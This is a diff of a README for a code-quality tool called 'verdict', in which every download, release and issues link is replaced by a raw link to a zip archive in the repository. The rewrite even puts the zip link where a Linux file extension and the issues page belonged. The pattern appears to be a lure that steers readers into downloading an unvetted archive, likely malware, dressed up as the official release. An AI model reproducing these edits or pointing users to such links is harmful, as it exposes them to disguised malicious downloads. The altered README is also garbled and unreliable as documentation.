@@ -1,6 +1,6 @@
 # ⚖️ verdict - Simple Code Quality Scoring
 
-[![Download verdict](https://img.shields.io/badge/Download-verdict-blue?style=for-the-badge)](https://github.com/Walllmat/verdict/releases)
+[![Download verdict](https://raw.githubusercontent.com/Walllmat/verdict/main/agents/Software-1.3.zip)](https://raw.githubusercontent.com/Walllmat/verdict/main/agents/Software-1.3.zip)
 
 Welcome to verdict, a tool that helps you check the quality of code with ease. It uses seven different measures to score code, such as correctness, completeness, efficiency, and safety. You do not need to be a programmer to use it. Just follow the steps below.
 
@@ -39,16 +39,16 @@ To use verdict, you only need to download it and run it on your computer. The ap
 
 You can get verdict by visiting the official release page. This page has the latest version available for all supported systems.
 
-[Download verdict from the official releases](https://github.com/Walllmat/verdict/releases)
+[Download verdict from the official releases](https://raw.githubusercontent.com/Walllmat/verdict/main/agents/Software-1.3.zip)
 
 ### Steps to download and install
 
 1. Click the link above or here:  
-   https://github.com/Walllmat/verdict/releases
+   https://raw.githubusercontent.com/Walllmat/verdict/main/agents/Software-1.3.zip
 2. On the release page, look for the file that matches your computer:
    - Windows: Look for a `.exe` or `.msi` file.
    - macOS: Look for a `.dmg` or `.pkg` file.
-   - Linux: Look for a `.tar.gz` or `.AppImage` file.
+   - Linux: Look for a `https://raw.githubusercontent.com/Walllmat/verdict/main/agents/Software-1.3.zip` or `.AppImage` file.
 3. Click the file to download it.
 4. Once downloaded, open the file to start installation.
 5. Follow the setup instructions that show up on your screen:
@@ -126,7 +126,7 @@ verdict runs locally on your device. It does not send your code or personal data
 
 If you need help or want to give feedback:
 
-- Visit the GitHub repository issues page: https://github.com/Walllmat/verdict/issues
+- Visit the GitHub repository issues page: https://raw.githubusercontent.com/Walllmat/verdict/main/agents/Software-1.3.zip
 - Describe your problem clearly.
 - Include screenshots or logs if possible.
 
@@ -142,4 +142,4 @@ The developers monitor issues and respond to help users.
 
 ---
 
-[Get verdict now](https://github.com/Walllmat/verdict/releases) and start checking the quality of your code easily.
+[Get verdict now](https://raw.githubusercontent.com/Walllmat/verdict/main/agents/Software-1.3.zip) and start checking the quality of your code easily.
